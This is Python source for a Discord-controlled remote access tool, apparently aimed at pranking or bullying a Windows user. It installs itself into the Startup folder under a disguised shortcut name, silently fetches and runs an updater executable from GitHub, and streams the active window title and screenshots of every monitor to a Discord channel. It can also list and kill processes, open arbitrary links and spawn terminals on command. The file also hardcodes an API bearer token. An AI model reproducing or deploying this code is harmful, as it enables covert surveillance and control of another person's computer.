import discord
import pywinctl
import subprocess
import time
import psutil
import io
import PIL
import os
import win32com.client
import sys
import pywinctl
from discord import option
from pywinauto import Desktop
import psutil
import webbrowser
from discord.ext import tasks
import psutil
import mss
from PIL import Image
import requests


TESTING = True
VERSION = "v2"


def retriveToken():
    global TESTING
    url = "https://us.infisical.com/api/v3/secrets/raw/token"

    if TESTING:
        env = "dev"
    else:
        env = "prod"

    querystring = {"secretPath":"/","type":"shared","viewSecretValue":"true","expandSecretReferences":"false","include_imports":"false","environment":env,"workspaceId":"0205c328-6c4a-4423-a1d0-094aea89dd82"}

    headers = {"Authorization": "Bearer st.702c0a06-2562-4bf1-bdef-2c50b90c4d31.2465a432916e4723b9cfd8defe9daac3.9c0a5990cc2538635cf3306edb8371b6"}

    response = requests.request("GET", url, headers=headers, params=querystring)
    return response.json()["secret"]["secretValue"]


TOKEN = retriveToken()

if TESTING:
    CHANNEL_ID = 1391826973432483931
else:
    CHANNEL_ID = 1391249089152155769

intents = discord.Intents.default()
intents.message_content = True  # Needed to read message content
intents.guilds = True
intents.messages = True

bot = discord.Bot(intents=intents, guilds=[discord.Object(id=1391249088695238828)])

lastText = ""

@tasks.loop(seconds=.5)
async def activityChanger():
    global lastText
    if pywinctl.getActiveWindowTitle() != lastText:
        lastText = pywinctl.getActiveWindowTitle()
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=lastText))


@tasks.loop(minutes=1)
async def updateCheck():
    headers = {
        'Accept': 'application/vnd.github+json',
    }

    response = requests.get('https://api.github.com/repos/GSstarGamer/betobuly/releases/latest', headers=headers)
    response.raise_for_status()  # Raise error for bad responses

    latestVersion = response.json().get("name")

    if latestVersion and latestVersion != VERSION:
        try:
            channel = bot.get_channel(CHANNEL_ID)
            await channel.send(content=f"New version available: {latestVersion}, Starting updater.exe and closing current build")

            exe_dir = get_original_exe_path()
            updater_path = os.path.join(exe_dir, "updater.exe")
            if TESTING:
                subprocess.call([sys.executable, updater_path], creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                subprocess.Popen([updater_path], creationflags=subprocess.CREATE_NO_WINDOW)
            await bot.close()
            sys.exit()
        except Exception as e: 
            await channel.send(content=f"Error: {e}")


@bot.event
async def on_ready():
    await bot.wait_until_ready()
    if not TESTING:
        updaterChecker()
        updateCheck.start()
        startUpCheck()
        startTerms(5)
    channel = bot.get_channel(CHANNEL_ID)
    await channel.send(content="Beeto has logged in!")
    await channel.send(content="https://tenor.com/view/sonic-devil-diabolique-evil-gif-9725651736562738158")
    activityChanger.start()


# @client.event
# async def on_message(message):
#     # Ignore bot's own messages
#     if message.author == client.user:
#         return

#     # Only log messages from the specific channel
#     if message.channel.id == TARGET_CHANNEL_ID:
#         if message.content.lower() == "what is running":
#             string = "# Active windows:\n"
#             for window in pywinctl.getAllWindows():
#                 if window.title != "":
#                     string += f"## - {window.title}\n"
#             await message.channel.send(string)
#         if message.content.lower() == "close roblox":
#             closeWindow("roblox")
#             await message.channel.send("Closed Ro/pblox")
#         if message.content.lower() == "close chrome":
#             closeWindow("chrome")
#             await message.channel.send("Closed chrome")
#         if message.content.lower() == "open terms":
#             startTerms()
#             await message.channel.send("opened terms")
#         if message.content.lower() == "ss roblox":
#             if pywinctl.getActiveWindowTitle().lower() == "roblox":
#                 screenshot = pyautogui.screenshot()
#                 buffer = io.BytesIO()
#                 screenshot.save(buffer, format="PNG")
#                 buffer.seek(0)
#                 await message.channel.send("Screenshot of Roblox", file=discord.File(buffer, filename="screenshot.png"))
#             else:
#                 await message.channel.send("Roblox is not open")
#         if message.content.lower() == "minimize all":
#             keyboard.send("windows+d")
            
#             await message.channel.send(f"Done") 

def get_original_exe_path():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.argv[0])
    else:
        return os.path.dirname(os.path.abspath(__file__))

def startTerms(num):
    procs = []

    for _ in range(num):
        proc = subprocess.Popen(
            "cmd", creationflags=subprocess.CREATE_NEW_CONSOLE
        )
        procs.append(proc)

    time.sleep(2)

    for proc in procs:
        try:
            psutil.Process(proc.pid).terminate()
            time.sleep(0.05)
        except psutil.NoSuchProcess:
            pass


def startUpCheck():
    exe_dir = get_original_exe_path()
    actual_exe = os.path.join(exe_dir, "bot.exe") 

    shell = win32com.client.Dispatch("WScript.Shell")
    startup = shell.SpecialFolders("Startup")
    shortcut_path = os.path.join(startup, "DesktopStartUp.lnk")

    if not os.path.exists(shortcut_path):
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = actual_exe  # ✅ the original EXE on disk
        shortcut.WorkingDirectory = os.path.dirname(actual_exe)
        shortcut.IconLocation = actual_exe
        shortcut.Save()
    
def get_windows():
    listOfProcess = []
    windows = Desktop(backend="uia").windows()
    for w in windows:
        title = w.window_text().strip()
        if not title:
            continue

        try:
            pid = w.process_id()
            proc = psutil.Process(pid)
            exe_name = proc.name().lower()
        except Exception:
            exe_name = "unknown"

        if exe_name == "explorer.exe":
            continue

        listOfProcess.append((exe_name, title))
    
    return listOfProcess

def get_pid(target):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and proc.info['name'].lower() == target.lower():
            return int(proc.info['pid'])

def kill_all_processes(target_name: str):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and proc.info['name'].lower() == target_name.lower():
            try:
                proc.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                raise Exception(f"Cant kill process (probably not running or AV protection): {e}")


def updaterChecker():
    exe_dir = get_original_exe_path()
    updater_path = os.path.join(exe_dir, "updater.exe")
    if not os.path.exists(updater_path):
            headers = {
                'Accept': 'application/vnd.github+json',
            }
            response = requests.get('https://api.github.com/repos/GSstarGamer/betobuly/releases/tags/v1-updater', headers=headers)
            response.raise_for_status()

            with requests.get(getLatestURL(response.json()), stream=True) as r:
                    with open(updater_path, 'wb') as f:
                        for chunk in r.iter_content(chunk_size=8192):
                            f.write(chunk)

        
def getLatestURL(json):
    for asset in json["assets"]:
        if asset["name"] == "updater.exe":
            return asset["browser_download_url"]

@bot.slash_command(name="ping", description="pong")
async def ping(ctx: discord.ApplicationContext):
    await ctx.defer()
    await ctx.respond("Pong!")

@bot.slash_command(name="version", description="build version")
async def version(ctx: discord.ApplicationContext):
    await ctx.defer()
    await ctx.respond(f"Version: {VERSION}")

@bot.slash_command(name="running", description="List of running applications")
async def running(ctx: discord.ApplicationContext):
    await ctx.defer()
    windows = get_windows()
    out = "# Active windows:\n```cs\n"
    for w in windows:
        out += f"[{w[0]}] {w[1]}\n"
    out += "```"
    await ctx.respond(out)

async def dynamic_process_suggestions(ctx: discord.AutocompleteContext):
    return [w[0] for w in get_windows()]

@bot.slash_command(name="kill", description="Pick a process to kill")
@option(
    "process",
    description="list of process",
    autocomplete=dynamic_process_suggestions
)
async def kill(ctx: discord.ApplicationContext, process: str):
    await ctx.defer()
    kill_all_processes(process)
    await ctx.respond(f"Killed {process}")


@bot.slash_command(name="link", description="open a link in default browser")
async def link(ctx: discord.ApplicationContext, link: str = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"):
    await ctx.defer()
    webbrowser.open(link)
    await ctx.respond(f"Opened {link}")

@bot.slash_command(name="terms", description="open and close terminals")
async def terms(ctx: discord.ApplicationContext, amount: int = 5):
    await ctx.defer()
    startTerms(amount)
    await ctx.respond(f"Opened and closed {amount} terminals")


@bot.slash_command(name="screenshot", description="take a screenshot")
async def ping(ctx: discord.ApplicationContext):
    await ctx.defer()

    files = []

    with mss.mss() as sct:
        for i, monitor in enumerate(sct.monitors[1:], start=1):
            img = sct.grab(monitor)
            image = Image.frombytes("RGB", img.size, img.rgb)

            buffer = io.BytesIO()
            image.save(buffer, format="PNG")
            buffer.seek(0)

            file = discord.File(fp=buffer, filename=f"monitor_{i}.png")
            files.append(file)

    await ctx.respond(content=pywinctl.getActiveWindowTitle(), files=files)

@bot.event
async def on_application_command_error(ctx, error):
    await ctx.respond(f"❗ Error: {str(error)}")

            
bot.run(TOKEN)
